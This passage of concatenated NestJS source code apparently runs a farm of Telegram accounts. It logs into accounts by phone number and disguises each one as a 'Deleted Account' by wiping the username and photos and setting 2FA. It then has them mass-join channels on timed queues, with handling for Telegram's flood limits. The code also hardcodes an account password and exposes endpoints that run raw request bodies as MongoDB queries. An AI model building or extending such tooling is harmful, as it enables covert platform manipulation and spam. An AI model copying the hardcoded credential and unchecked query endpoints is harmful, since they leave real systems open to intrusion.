'🤗', '🆒',\r\n    '🗿', '🙉', '🙊', '🤷', '👎'\r\n  ];\r\n\r\n  @ApiProperty({ default: false })\r\n  banned?: boolean = false;\r\n\r\n  @ApiProperty({ default: true, required: false })\r\n  megagroup?: boolean;\r\n\r\n  @ApiProperty({ default: false, required: false })\r\n  forbidden?: boolean\r\n\r\n  @ApiProperty({\r\n    description: 'Whether the channel is private',\r\n    example: false,\r\n    required: false,\r\n  })\r\n  private: boolean = false;\r\n}\r\n","// src/activechannels/dto/update-activechannel.dto.ts\r\nimport { PartialType } from '@nestjs/swagger';\r\nimport { CreateActiveChannelDto } from './create-active-channel.dto';\r\n\r\nexport class UpdateActiveChannelDto extends PartialType(CreateActiveChannelDto) {}\r\n","import { Prop, Schema, SchemaFactory } from '@nestjs/mongoose';\r\nimport { Document } from 'mongoose';\r\nimport * as mongoose from 'mongoose';\r\nimport { ApiProperty } from '@nestjs/swagger';\r\nimport { defaultMessages, defaultReactions } from '../../../utils';\r\n\r\nexport type ActiveChannelDocument = ActiveChannel & Document;\r\n\r\n@Schema({ collection: 'activeChannels', versionKey: false, autoIndex: true,\r\n  timestamps: true,\r\n  toJSON: {\r\n    virtuals: true,\r\n    transform: (doc, ret) => {\r\n      delete ret._id;\r\n    },\r\n  },\r\n })\r\nexport class ActiveChannel {\r\n  @ApiProperty({ required: true })\r\n  @Prop({ required: true, unique: true })\r\n  channelId: string;\r\n\r\n  @ApiProperty({ default: false })\r\n  @Prop({ default: false })\r\n  broadcast: boolean;\r\n\r\n  @ApiProperty({ default: true })\r\n  @Prop({ default: true })\r\n  canSendMsgs: boolean;\r\n\r\n  @ApiProperty({ type: Number, default: 0 })\r\n  @Prop({ type: mongoose.Schema.Types.Number, default: 0 })\r\n  participantsCount: number;\r\n\r\n  @ApiProperty({ default: false })\r\n  @Prop({ default: false })\r\n  restricted: boolean;\r\n\r\n  @ApiProperty({ default: false })\r\n  @Prop({ default: false })\r\n  sendMessages: boolean;\r\n\r\n  @ApiProperty({ required: true })\r\n  @Prop({ required: true })\r\n  title: string;\r\n\r\n  @ApiProperty({ required: false, default: null })\r\n  @Prop({ required: false, default: null })\r\n  username: string;\r\n\r\n  @ApiProperty({ type: Number, default: 0 })\r\n  @Prop({ type: mongoose.Schema.Types.Number, default: 0 })\r\n  wordRestriction: number;\r\n\r\n  @ApiProperty({ type: Number, default: 0 })\r\n  @Prop({ type: mongoose.Schema.Types.Number, default: 0 })\r\n  dMRestriction: number;\r\n\r\n  @ApiProperty({ type: [String], default:defaultMessages })\r\n  @Prop({ type: [String], default: defaultMessages })\r\n  availableMsgs: string[];\r\n\r\n  @ApiProperty({ type: [String], default: defaultReactions })\r\n  @Prop({\r\n    type: [String], default: defaultReactions\r\n  })\r\n  reactions: string[];\r\n\r\n  @ApiProperty({ default: false })\r\n  @Prop({ default: false })\r\n  banned: boolean;\r\n\r\n  @ApiProperty({ default: true })\r\n  @Prop({ default: true })\r\n  megagroup: boolean;\r\n\r\n  @ApiProperty({ default: false})\r\n  @Prop({ default: false })\r\n  private: boolean;\r\n\r\n  @ApiProperty({ default: false })\r\n  @Prop({ default: false })\r\n  reactRestricted: boolean\r\n\r\n  @ApiProperty({ default: false })\r\n  @Prop({ default: false })\r\n  forbidden: boolean\r\n}\r\n\r\nexport const ActiveChannelSchema = SchemaFactory.createForClass(ActiveChannel);\r\n","import { Controller, Get, Post, Body, Param, Delete, Query, Patch } from '@nestjs/common';\r\nimport { ApiTags, ApiOperation, ApiBody } from '@nestjs/swagger';\r\nimport { Client } from '../clients/schemas/client.schema';\r\nimport { ArchivedClientService } from './archived-client.service';\r\nimport { CreateClientDto } from '../clients/dto/create-client.dto';\r\nimport { SearchClientDto } from '../clients/dto/search-client.dto';\r\nimport { UpdateClientDto } from '../clients/dto/update-client.dto';\r\n\r\n@ApiTags('Archived Clients')\r\n@Controller('archived-clients')\r\nexport class ArchivedClientController {\r\n  constructor(private readonly archivedclientService: ArchivedClientService) { }\r\n\r\n  @Post()\r\n  @ApiOperation({ summary: 'Create user data' })\r\n  //@apiresponse({ status: 201, description: 'The user data has been successfully created.' })\r\n  //@apiresponse({ status: 403, description: 'Forbidden.' })\r\n  async create(@Body() createClientDto: CreateClientDto): Promise<Client> {\r\n    return this.archivedclientService.create(createClientDto);\r\n  }\r\n\r\n  @Get('search')\r\n  @ApiOperation({ summary: 'Search user data' })\r\n  //@apiresponse({ status: 200, description: 'Return the searched user data.' })\r\n  async search(@Query() query: SearchClientDto): Promise<Client[]> {\r\n    return this.archivedclientService.search(query);\r\n  }\r\n\r\n  @Get()\r\n  @ApiOperation({ summary: 'Get all user data' })\r\n  //@apiresponse({ status: 200, description: 'Return all user data.' })\r\n  //@apiresponse({ status: 403, description: 'Forbidden.' })\r\n  async findAll(): Promise<Client[]> {\r\n    return this.archivedclientService.findAll();\r\n  }\r\n  \r\n  @Get('checkArchivedClients')\r\n  @ApiOperation({ summary: 'Get user data by ID' })\r\n  //@apiresponse({ status: 200, description: 'Return the user data.' })\r\n  //@apiresponse({ status: 404, description: 'User data not found.' })\r\n  async checkArchivedClients(): Promise<string> {\r\n    return this.archivedclientService.checkArchivedClients();\r\n  }\r\n\r\n  @Get(':mobile')\r\n  @ApiOperation({ summary: 'Get user data by ID' })\r\n  //@apiresponse({ status: 200, description: 'Return the user data.' })\r\n  //@apiresponse({ status: 404, description: 'User data not found.' })\r\n  async findOne(@Param('mobile') mobile: string): Promise<Client> {\r\n    return this.archivedclientService.findOne(mobile);\r\n  }\r\n  \r\n  @Get('fetchOne/:mobile')\r\n  @ApiOperation({ summary: 'Get user data by ID' })\r\n  //@apiresponse({ status: 200, description: 'Return the user data.' })\r\n  //@apiresponse({ status: 404, description: 'User data not found.' })\r\n  async fetchOne(@Param('mobile') mobile: string): Promise<Client> {\r\n    return this.archivedclientService.fetchOne(mobile);\r\n  }\r\n\r\n  @Patch(':mobile')\r\n  @ApiOperation({ summary: 'Update user data by ID' })\r\n  //@apiresponse({ status: 200, description: 'The user data has been successfully updated.' })\r\n  //@apiresponse({ status: 404, description: 'User data not found.' })\r\n  async update(@Param('mobile') mobile: string, @Body() updateClientDto: UpdateClientDto): Promise<Client> {\r\n    return this.archivedclientService.update(mobile, updateClientDto);\r\n  }\r\n\r\n  @Delete(':mobile')\r\n  @ApiOperation({ summary: 'Delete user data by ID' })\r\n  //@apiresponse({ status: 200, description: 'The user data has been successfully deleted.' })\r\n  //@apiresponse({ status: 404, description: 'User data not found.' })\r\n  async remove(@Param('mobile') mobile: string): Promise<Client> {\r\n    return this.archivedclientService.remove(mobile);\r\n  }\r\n\r\n  @Post('query')\r\n  @ApiOperation({ summary: 'Execute a custom MongoDB query' })\r\n  //@apiresponse({ status: 200, description: 'Query executed successfully.' })\r\n  //@apiresponse({ status: 400, description: 'Invalid query.' })\r\n  //@apiresponse({ status: 500, description: 'Internal server error.' })\r\n  @ApiBody({type: Object})\r\n  async executeQuery(@Body() query: object): Promise<any> {\r\n    try {\r\n      return await this.archivedclientService.executeQuery(query);\r\n    } catch (error) {\r\n      throw error;  // You might want to handle errors more gracefully\r\n    }\r\n  }\r\n}\r\n","import { Module, forwardRef } from '@nestjs/common';\r\nimport { MongooseModule } from '@nestjs/mongoose';\r\nimport { ClientSchema } from '../clients/schemas/client.schema';\r\nimport { TelegramModule } from '../Telegram/Telegram.module';\r\nimport { ArchivedClientService } from './archived-client.service';\r\nimport { ArchivedClientController } from './archived-client.controller';\r\nimport { initModule } from '../ConfigurationInit/init.module';\r\nimport { ClientModule } from '../clients/client.module';\r\n\r\n@Module({\r\n  imports: [\r\n    initModule,\r\n    MongooseModule.forFeature([{ collection: 'ArchivedClients', name: 'ArchivedArchivedClientsModule', schema: ClientSchema }]),\r\n    forwardRef(() => TelegramModule),\r\n    forwardRef(() => ClientModule)\r\n  ],\r\n  controllers: [ArchivedClientController],\r\n  providers: [ArchivedClientService],\r\n  exports: [ArchivedClientService]\r\n})\r\nexport class ArchivedClientModule { }\r\n","import { BadRequestException, Inject, Injectable, InternalServerErrorException, NotFoundException, forwardRef } from '@nestjs/common';\r\nimport { InjectModel } from '@nestjs/mongoose';\r\nimport { Model } from 'mongoose';\r\nimport { CreateClientDto } from '../clients/dto/create-client.dto';\r\nimport { Client, ClientDocument } from '../clients/schemas/client.schema';\r\nimport { UpdateClientDto } from '../clients/dto/update-client.dto';\r\nimport { TelegramService } from '../Telegram/Telegram.service';\r\nimport { sleep } from 'telegram/Helpers';\r\nimport { ClientService } from '../clients/client.service';\r\nimport { parseError } from '../../utils';\r\n\r\n@Injectable()\r\nexport class ArchivedClientService {\r\n    constructor(@InjectModel('ArchivedArchivedClientsModule') private archivedclientModel: Model<ClientDocument>,\r\n        @Inject(forwardRef(() => TelegramService))\r\n        private telegramService: TelegramService,\r\n        @Inject(forwardRef(() => ClientService))\r\n        private clientService: ClientService,\r\n    ) { }\r\n\r\n    async create(createClientDto: CreateClientDto): Promise<Client> {\r\n        const createdUser = new this.archivedclientModel(createClientDto);\r\n        return createdUser.save();\r\n    }\r\n\r\n    async findAll(): Promise<Client[]> {\r\n        const results: Client[] = await this.archivedclientModel.find().exec();\r\n        return results\r\n    }\r\n\r\n    async findOne(mobile: string): Promise<Client> {\r\n        const user = (await this.archivedclientModel.findOne({ mobile }).exec())?.toJSON();\r\n        return user;\r\n    }\r\n\r\n    async fetchOne(mobile: string): Promise<Client> {\r\n        const user = (await this.archivedclientModel.findOne({ mobile }).exec())?.toJSON();\r\n        if (user) {\r\n            return user;\r\n        } else {\r\n            try {\r\n                await this.telegramService.createClient(mobile, false, true)\r\n                const newSession = await this.telegramService.createNewSession(mobile);\r\n                await this.telegramService.deleteClient(mobile)\r\n                return await this.create({\r\n                    \"channelLink\": \"default\",\r\n                    \"clientId\": \"default\",\r\n                    \"dbcoll\": \"default\",\r\n                    \"deployKey\": \"default\",\r\n                    \"link\": \"default\",\r\n                    \"mainAccount\": \"default\",\r\n                    promoteRepl: \"default\",\r\n                    \"name\": \"default\",\r\n                    \"password\": \"Ajtdmwajt1@\",\r\n                    \"repl\": \"default\",\r\n                    \"session\": newSession,\r\n                    \"username\": \"default\",\r\n                    \"mobile\": mobile,\r\n                    product: \"default\"\r\n                })\r\n            } catch (e) {\r\n                await this.telegramService.deleteClient(mobile)\r\n                throw new NotFoundException(parseError(e).message);\r\n            }\r\n        }\r\n    }\r\n\r\n    async update(mobile: string, updateClientDto: UpdateClientDto): Promise<Client> {\r\n        delete updateClientDto[\"_id\"]\r\n        if ((<any>updateClientDto)._doc) {\r\n            delete (<any>updateClientDto)._doc['_id']\r\n        }\r\n        console.log({ ...updateClientDto });\r\n        const updatedUser = await this.archivedclientModel.findOneAndUpdate({ mobile }, { $set: updateClientDto }, { new: true, upsert: true }).exec();\r\n        return updatedUser;\r\n    }\r\n\r\n    async remove(mobile: string): Promise<Client> {\r\n        const deletedUser = await this.archivedclientModel.findOneAndDelete({ mobile }).exec();\r\n        if (!deletedUser) {\r\n            throw new NotFoundException(`Client with ID \"${mobile}\" not found`);\r\n        }\r\n        return deletedUser;\r\n    }\r\n\r\n    async search(filter: any): Promise<Client[]> {\r\n        console.log(filter)\r\n        if (filter.firstName) {\r\n            filter.firstName = { $regex: new RegExp(filter.firstName, 'i') }\r\n        }\r\n        console.log(filter)\r\n        return this.archivedclientModel.find(filter).exec();\r\n    }\r\n\r\n    async checkArchivedClients() {\r\n        await this.telegramService.disconnectAll()\r\n        await sleep(2000);\r\n        const archivedClients = await this.findAll();\r\n\r\n        const clients = await this.clientService.findAll();\r\n        const clientIds = clients.map(client => client.mobile);\r\n\r\n        archivedClients.map(async (document) => {\r\n            if (!clientIds.includes(document.mobile)) {\r\n                try {\r\n                    await this.telegramService.createClient(document.mobile, true, false);\r\n                    await this.telegramService.updateUsername(document.mobile, '');\r\n                    await this.telegramService.updateNameandBio(document.mobile, 'Deleted Account', '');\r\n                    await this.telegramService.deleteClient(document.mobile)\r\n                    await sleep(2000);\r\n                } catch (error) {\r\n                    console.log(document.mobile, \" :  false\");\r\n                    this.remove(document.mobile)\r\n                    await this.telegramService.deleteClient(document.mobile)\r\n                }\r\n            } else {\r\n                console.log(\"Number is a Active Client\")\r\n            }\r\n        })\r\n\r\n        return \"Triggered ArchiveClients check\"\r\n    }\r\n\r\n    async executeQuery(query: any): Promise<any> {\r\n        try {\r\n            if (!query) {\r\n                throw new BadRequestException('Query is invalid.');\r\n            }\r\n            return await this.archivedclientModel.find(query).exec();\r\n        } catch (error) {\r\n            throw new InternalServerErrorException(error.message);\r\n        }\r\n    }\r\n}\r\n","import { Controller, Get, Post, Body, Param, Delete, Query, Patch, Put } from '@nestjs/common';\r\nimport { ApiTags, ApiOperation, ApiBody, ApiParam } from '@nestjs/swagger';\r\nimport { BufferClientService } from './buffer-client.service';\r\nimport { CreateBufferClientDto } from './dto/create-buffer-client.dto';\r\nimport { SearchBufferClientDto } from './dto/search-buffer- client.dto';\r\nimport { BufferClient } from './schemas/buffer-client.schema';\r\nimport { UpdateBufferClientDto } from './dto/update-buffer-client.dto';\r\n\r\n@ApiTags('Buffer Clients')\r\n@Controller('bufferclients')\r\nexport class BufferClientController {\r\n  constructor(private readonly clientService: BufferClientService) { }\r\n\r\n  @Post()\r\n  @ApiOperation({ summary: 'Create user data' })\r\n  async create(@Body() createClientDto: CreateBufferClientDto): Promise<BufferClient> {\r\n    return this.clientService.create(createClientDto);\r\n  }\r\n\r\n  @Get('search')\r\n  @ApiOperation({ summary: 'Search user data' })\r\n  async search(@Query() query: SearchBufferClientDto): Promise<BufferClient[]> {\r\n    return this.clientService.search(query);\r\n  }\r\n\r\n  @Get('joinChannelsForBufferClients')\r\n  @ApiOperation({ summary: 'Join Channels for BufferClients' })\r\n  async joinChannelsforBufferClients(): Promise<string> {\r\n    return this.clientService.joinchannelForBufferClients();\r\n  }\r\n\r\n  @Get('checkBufferClients')\r\n  @ApiOperation({ summary: 'Check Buffer Clients' })\r\n  async checkbufferClients(): Promise<string> {\r\n    this.clientService.checkBufferClients();\r\n    return \"initiated Checking\"\r\n  }\r\n\r\n  @Post('addNewUserstoBufferClients')\r\n  @ApiOperation({ summary: 'Add New Users to Buffer Clients' })\r\n  @ApiBody({ type: Object })\r\n  async addNewUserstoBufferClients(@Body() body: { goodIds: string[], badIds: string[] }): Promise<string> {\r\n    this.clientService.addNewUserstoBufferClients(body.badIds, body.goodIds);\r\n    return \"initiated Checking\"\r\n  }\r\n\r\n  @Get()\r\n  @ApiOperation({ summary: 'Get all user data' })\r\n  async findAll(): Promise<BufferClient[]> {\r\n    return this.clientService.findAll();\r\n  }\r\n\r\n  @Get('SetAsBufferClient/:mobile')\r\n  @ApiOperation({ summary: 'Set as Buffer Client' })\r\n  @ApiParam({ name: 'mobile', description: 'User mobile number', type: String })\r\n  async setAsBufferClient(\r\n    @Param('mobile') mobile: string,\r\n  ) {\r\n    return await this.clientService.setAsBufferClient(mobile);\r\n  }\r\n\r\n  @Get(':mobile')\r\n  @ApiOperation({ summary: 'Get user data by ID' })\r\n  async findOne(@Param('mobile') mobile: string): Promise<BufferClient> {\r\n    return this.clientService.findOne(mobile);\r\n  }\r\n\r\n  @Patch(':mobile')\r\n  @ApiOperation({ summary: 'Update user data by ID' })\r\n  async update(@Param('mobile') mobile: string, @Body() updateClientDto: UpdateBufferClientDto): Promise<BufferClient> {\r\n    return this.clientService.update(mobile, updateClientDto);\r\n  }\r\n\r\n  @Put(':mobile')\r\n  @ApiOperation({ summary: 'Update user data by ID' })\r\n  async createdOrupdate(@Param('mobile') mobile: string, @Body() updateClientDto: UpdateBufferClientDto): Promise<BufferClient> {\r\n    return this.clientService.createOrUpdate(mobile, updateClientDto);\r\n  }\r\n\r\n  @Delete(':mobile')\r\n  @ApiOperation({ summary: 'Delete user data by ID' })\r\n  async remove(@Param('mobile') mobile: string): Promise<void> {\r\n    return this.clientService.remove(mobile);\r\n  }\r\n\r\n  @Post('query')\r\n  @ApiOperation({ summary: 'Execute a custom MongoDB query' })\r\n  @ApiBody({ type: Object })\r\n  async executeQuery(@Body() query: object): Promise<any> {\r\n    try {\r\n      return await this.clientService.executeQuery(query);\r\n    } catch (error) {\r\n      throw error;  // You might want to handle errors more gracefully\r\n    }\r\n  }\r\n\r\n}\r\n","import { Module, forwardRef } from '@nestjs/common';\r\nimport { MongooseModule } from '@nestjs/mongoose';\r\nimport { BufferClientService } from './buffer-client.service';\r\nimport { BufferClientController } from './buffer-client.controller';\r\nimport { BufferClientSchema } from './schemas/buffer-client.schema';\r\nimport { TelegramModule } from '../Telegram/Telegram.module';\r\nimport { ActiveChannelsModule } from '../active-channels/active-channels.module';\r\nimport { UsersModule } from '../users/users.module';\r\nimport { ClientModule } from '../clients/client.module';\r\nimport { initModule } from '../ConfigurationInit/init.module';\r\nimport { ChannelsModule } from '../channels/channels.module';\r\nimport { PromoteClientModule } from '../promote-clients/promote-client.module';\r\n\r\n@Module({\r\n  imports: [\r\n    initModule,\r\n    MongooseModule.forFeature([{ name: 'bufferClientModule', schema: BufferClientSchema, collection: 'bufferClients' }]),\r\n    forwardRef(() => TelegramModule),\r\n    forwardRef(() => UsersModule),\r\n    forwardRef(() => ActiveChannelsModule),\r\n    forwardRef(() => ClientModule),\r\n    forwardRef(() => ChannelsModule),\r\n    forwardRef(() => PromoteClientModule)\r\n ],\r\n  controllers: [BufferClientController],\r\n  providers: [BufferClientService],\r\n  exports: [BufferClientService]\r\n})\r\nexport class BufferClientModule { }\r\n","import { ChannelsService } from './../channels/channels.service';\r\nimport { Channel } from './../channels/schemas/channel.schema';\r\nimport { BadRequestException, ConflictException, HttpException, Inject, Injectable, InternalServerErrorException, NotFoundException, forwardRef } from '@nestjs/common';\r\nimport { InjectModel } from '@nestjs/mongoose';\r\nimport { Model } from 'mongoose';\r\nimport { CreateBufferClientDto } from './dto/create-buffer-client.dto';\r\nimport { BufferClient, BufferClientDocument } from './schemas/buffer-client.schema';\r\nimport { TelegramService } from '../Telegram/Telegram.service';\r\nimport { sleep } from 'telegram/Helpers';\r\nimport { UsersService } from '../users/users.service';\r\nimport { ActiveChannelsService } from '../active-channels/active-channels.service';\r\nimport { fetchWithTimeout, parseError, ppplbot } from '../../utils';\r\nimport { ClientService } from '../clients/client.service';\r\nimport { UpdateBufferClientDto } from './dto/update-buffer-client.dto';\r\nimport { PromoteClientService } from '../promote-clients/promote-client.service';\r\n\r\n@Injectable()\r\nexport class BufferClientService {\r\n    private joinChannelMap: Map<string, Channel[]> = new Map();\r\n    private joinChannelIntervalId: NodeJS.Timeout;\r\n    constructor(@InjectModel('bufferClientModule') private bufferClientModel: Model<BufferClientDocument>,\r\n        @Inject(forwardRef(() => TelegramService))\r\n        private telegramService: TelegramService,\r\n        @Inject(forwardRef(() => UsersService))\r\n        private usersService: UsersService,\r\n        @Inject(forwardRef(() => ActiveChannelsService))\r\n        private activeChannelsService: ActiveChannelsService,\r\n        @Inject(forwardRef(() => ClientService))\r\n        private clientService: ClientService,\r\n        @Inject(forwardRef(() => ActiveChannelsService))\r\n        private channelsService: ChannelsService,\r\n        @Inject(forwardRef(() => PromoteClientService))\r\n        private promoteClientService: PromoteClientService,\r\n    ) {}\r\n\r\n    async create(bufferClient: CreateBufferClientDto): Promise<BufferClient> {\r\n        const newUser = new this.bufferClientModel(bufferClient);\r\n        return newUser.save();\r\n    }\r\n\r\n    async findAll(): Promise<BufferClient[]> {\r\n        return this.bufferClientModel.find().exec();\r\n    }\r\n\r\n    async findOne(mobile: string, throwErr: boolean = true): Promise<BufferClient> {\r\n        const user = (await this.bufferClientModel.findOne({ mobile }).exec())?.toJSON();\r\n        if (!user && throwErr) {\r\n            throw new NotFoundException(`BufferClient with mobile ${mobile} not found`);\r\n        }\r\n        return user;\r\n    }\r\n\r\n\r\n    async update(mobile: string, updateClientDto: UpdateBufferClientDto): Promise<BufferClient> {\r\n        const updatedUser = await this.bufferClientModel.findOneAndUpdate(\r\n            { mobile },\r\n            { $set: updateClientDto },\r\n            { new: true, upsert: true, returnDocument: 'after' }\r\n        ).exec();\r\n\r\n        if (!updatedUser) {\r\n            throw new NotFoundException(`User with mobile ${mobile} not found`);\r\n        }\r\n\r\n        return updatedUser;\r\n    }\r\n\r\n    async createOrUpdate(mobile: string, createOrUpdateUserDto: CreateBufferClientDto | UpdateBufferClientDto): Promise<BufferClient> {\r\n        const existingUser = (await this.bufferClientModel.findOne({ mobile }).exec())?.toJSON();\r\n        if (existingUser) {\r\n            console.log(\"Updating\")\r\n            return this.update(existingUser.mobile, createOrUpdateUserDto as UpdateBufferClientDto);\r\n        } else {\r\n            console.log(\"creating\")\r\n            return this.create(createOrUpdateUserDto as CreateBufferClientDto);\r\n        }\r\n    }\r\n\r\n    async remove(mobile: string): Promise<void> {\r\n        await fetchWithTimeout(`${ppplbot()}&text=${encodeURIComponent(`Deleting Buffer Client : ${mobile}`)}`);\r\n        const result = await this.bufferClientModel.deleteOne({ mobile }).exec();\r\n        if (result.deletedCount === 0) {\r\n            throw new NotFoundException(`BufferClient with mobile ${mobile} not found`);\r\n        }\r\n    }\r\n    async search(filter: any): Promise<BufferClient[]> {\r\n        console.log(filter)\r\n        if (filter.firstName) {\r\n            filter.firstName = { $regex: new RegExp(filter.firstName, 'i') }\r\n        }\r\n        console.log(filter)\r\n        return this.bufferClientModel.find(filter).exec();\r\n    }\r\n\r\n    async executeQuery(query: any, sort?: any, limit?: number, skip?: number): Promise<BufferClient[]> {\r\n        try {\r\n\r\n            if (!query) {\r\n                throw new BadRequestException('Query is invalid.');\r\n            }\r\n            const queryExec = this.bufferClientModel.find(query);\r\n            if (sort) {\r\n                queryExec.sort(sort);\r\n            }\r\n\r\n            if (limit) {\r\n                queryExec.limit(limit);\r\n            }\r\n\r\n            if (skip) {\r\n                queryExec.skip(skip);\r\n            }\r\n\r\n            return await queryExec.exec();\r\n        } catch (error) {\r\n            throw new InternalServerErrorException(error.message);\r\n        }\r\n    }\r\n\r\n    removeFromBufferMap(key: string) {\r\n        this.joinChannelMap.delete(key)\r\n    }\r\n    clearBufferMap() {\r\n        console.log(\"BufferMap cleared\")\r\n        this.joinChannelMap.clear()\r\n    }\r\n\r\n    async joinchannelForBufferClients(skipExisting: boolean = true): Promise<string> {\r\n        if (!this.telegramService.getActiveClientSetup()) {\r\n            console.log(\"Joining Channel Started\")\r\n            await this.telegramService.disconnectAll();\r\n            this.clearJoinChannelInterval();\r\n            await sleep(2000);\r\n            const existingkeys = skipExisting ? [] : Array.from(this.joinChannelMap.keys())\r\n            // const today = (new Date(Date.now())).toISOString().split('T')[0];\r\n            const clients = await this.bufferClientModel.find({ channels: { \"$lt\": 350 }, mobile: { $nin: existingkeys } }).sort({ channels: 1 }).limit(4);\r\n            if (clients.length > 0) {\r\n                for (const document of clients) {\r\n                    try {\r\n                        const client = await this.telegramService.createClient(document.mobile, false, false);\r\n                        console.log(\"Started Joining for : \", document.mobile)\r\n                        const channels = await client.channelInfo(true);\r\n                        console.log(\"Existing Channels Length : \", channels.ids.length);\r\n                        await this.update(document.mobile, { channels: channels.ids.length });\r\n                        let result = [];\r\n                        if (channels.canSendFalseCount < 50) {\r\n                            if (channels.ids.length < 220) {\r\n                                result = await this.channelsService.getActiveChannels(150, 0, channels.ids);\r\n                            } else {\r\n                                result = await this.activeChannelsService.getActiveChannels(150, 0, channels.ids);\r\n                            }\r\n                            this.joinChannelMap.set(document.mobile, result);\r\n                            await this.telegramService.deleteClient(document.mobile);\r\n                        } else {\r\n                            client.leaveChannels(channels.canSendFalseChats)\r\n                        }\r\n                        // console.log(\"DbChannelsLen: \", result.length);\r\n                        // let resp = '';\r\n                        // this.telegramService.joinChannels(document.mobile, result);\r\n                    } catch (error) {\r\n                        await this.telegramService.deleteClient(document.mobile);\r\n                        parseError(error)\r\n                    }\r\n                }\r\n                this.joinChannelQueue();\r\n            }\r\n            console.log(\"Joining Channel Triggered Succesfully for \", clients.length);\r\n            return `Initiated Joining channels ${clients.length}`\r\n        } else {\r\n            console.log(\"ignored active check buffer channels as active client setup exists\")\r\n        }\r\n    }\r\n\r\n    async joinChannelQueue() {\r\n        const existingkeys = Array.from(this.joinChannelMap.keys())\r\n        if (existingkeys.length > 0) {\r\n            this.joinChannelIntervalId = setInterval(async () => {\r\n                const keys = Array.from(this.joinChannelMap.keys());\r\n                if (keys.length > 0) {\r\n                    console.log(\"In JOIN CHANNEL interval: \", new Date().toISOString());\r\n                    for (const mobile of keys) {\r\n                        const channels = this.joinChannelMap.get(mobile);\r\n                        if (channels && channels.length > 0) {\r\n                            const channel = channels.shift();\r\n                            console.log(mobile, \" Pending Channels :\", channels.length)\r\n                            this.joinChannelMap.set(mobile, channels);\r\n                            try {\r\n                                await this.telegramService.createClient(mobile, false, false);\r\n                                console.log(mobile, \" Trying to join :\", channel.username);\r\n                                await this.telegramService.tryJoiningChannel(mobile, channel);\r\n                            } catch (error) {\r\n                                await this.telegramService.deleteClient(mobile);\r\n                                const errorDetails = parseError(error, `${mobile} @${channel.username} Outer Err ERR: `);\r\n                                if (error.errorMessage == 'CHANNELS_TOO_MUCH' || errorDetails.error == 'FloodWaitError') {\r\n                                    this.removeFromBufferMap(mobile)\r\n                                    const channels = await this.telegramService.getChannelInfo(mobile, true);\r\n                                    // await this.update(mobile, { channels: channels.ids.length });\r\n                                }\r\n                            }\r\n                            await this.telegramService.deleteClient(mobile);\r\n                        } else {\r\n                            this.joinChannelMap.delete(mobile);\r\n                        }\r\n                    }\r\n                } else {\r\n                    this.clearJoinChannelInterval()\r\n                }\r\n            }, 4 * 60 * 1000);\r\n        }\r\n    }\r\n\r\n    clearJoinChannelInterval() {\r\n        if (this.joinChannelIntervalId) {\r\n            clearInterval(this.joinChannelIntervalId);\r\n            this.joinChannelIntervalId = null;\r\n            setTimeout(() => {\r\n                this.joinchannelForBufferClients(false)\r\n            }, 30000);\r\n        }\r\n    }\r\n\r\n    async setAsBufferClient(\r\n        mobile: string,\r\n        availableDate: string = (new Date(Date.now() - (24 * 60 * 60 * 1000))).toISOString().split('T')[0]\r\n    ) {\r\n        const user = (await this.usersService.search({ mobile }))[0];\r\n        if (!user) {\r\n            throw new BadRequestException('user not found');\r\n        }\r\n        const isExist = await this.findOne(mobile, false)\r\n        if (isExist) {\r\n            throw new ConflictException('BufferClient already exist');\r\n        }\r\n        const clients = await this.clientService.findAll();\r\n        const clientMobiles = clients.map(client => client?.mobile);\r\n        const clientPromoteMobiles = clients.flatMap(client => client?.promoteMobile);\r\n        if (!clientPromoteMobiles.includes(mobile) && !clientMobiles.includes(mobile)) {\r\n            try {\r\n                const telegramClient = await this.telegramService.createClient(mobile, false)\r\n                await telegramClient.set2fa();\r\n                await sleep(15000)\r\n                await telegramClient.updateUsername('');\r\n                await sleep(3000)\r\n                await telegramClient.updatePrivacyforDeletedAccount();\r\n                await sleep(3000)\r\n                await telegramClient.updateProfile(\"Deleted Account\", \"Deleted Account\");\r\n                // await sleep(3000)\r\n                // await telegramClient.deleteProfilePhotos();\r\n                // const channels = await this.telegramService.getChannelInfo(mobile, true)\r\n                // const bufferClient = {\r\n                //     tgId: user.tgId,\r\n                //     session: user.session,\r\n                //     mobile: user.mobile,\r\n                //     availableDate,\r\n                //     channels: channels.ids.length,\r\n                // }\r\n                // await this.bufferClientModel.findOneAndUpdate({ tgId: user.tgId }, { $set: bufferClient }, { new: true, upsert: true }).exec();\r\n            } catch (error) {\r\n                const errorDetails = parseError(error)\r\n                throw new HttpException(errorDetails.message, parseInt(errorDetails.status))\r\n            }\r\n            await this.telegramService.deleteClient(mobile)\r\n            return \"Client set as buffer successfully\";\r\n        } else {\r\n            throw new BadRequestException(\"Number is a Active Client\")\r\n        }\r\n    }\r\n\r\n    async checkBufferClients() {\r\n        if (!this.telegramService.getActiveClientSetup()) {\r\n            await this.telegramService.disconnectAll()\r\n            await sleep(2000);\r\n            const bufferclients = await this.findAll();\r\n            let goodIds: string[] = [];\r\n            let badIds: string[] = [];\r\n            if (bufferclients.length < 70) {\r\n                for (let i = 0; i < 70 - bufferclients.length; i++) {\r\n                    badIds.push(i.toString())\r\n                }\r\n            }\r\n            const clients = await this.clientService.findAll();\r\n            const promoteclients = await this.promoteClientService.findAll();\r\n            const clientIds = [...clients.map(client => client.mobile), ...clients.flatMap(client => { return (client.promoteMobile) })]\r\n            const promoteclientIds = promoteclients.map(client => client.mobile);\r\n            const today = (new Date(Date.now())).toISOString().split('T')[0];\r\n            for (const document of bufferclients) {\r\n                if (!clientIds.includes(document.mobile) && !promoteclientIds.includes(document.mobile)) {\r\n                    try {\r\n                        const cli = await this.telegramService.createClient(document.mobile, true, false);\r\n                        const me = await cli.getMe();\r\n                        if (me.username) {\r\n                            await this.telegramService.updateUsername(document.mobile, '');\r\n                            await sleep(2000)\r\n                        }\r\n                        if (me.firstName !== \"Deleted Account\") {\r\n                            await this.telegramService.updateNameandBio(document.mobile, 'Deleted Account', '');\r\n                            // await this.telegramService.updatePrivacyforDeletedAccount(document.mobile);\r\n                            await sleep(2000)\r\n                        }\r\n                        await this.telegramService.deleteProfilePhotos(document.mobile);\r\n                        const hasPassword = await cli.hasPassword();\r\n                        if (!hasPassword) {\r\n                            console.log(\"Client does not have password\");\r\n                            badIds.push(document.mobile);\r\n                            // await this.remove(document.mobile);\r\n                        } else {\r\n                            // const channelinfo = await this.telegramService.getChannelInfo(document.mobile, true);\r\n                            // await this.bufferClientModel.findOneAndUpdate({ mobile: document.mobile }, { channels: channelinfo.ids.length })\r\n                            console.log(document.mobile, \" :  ALL Good\");\r\n                            goodIds.push(document.mobile)\r\n                        }\r\n                        await this.telegramService.deleteClient(document.mobile)\r\n                        await sleep(2000);\r\n                    } catch 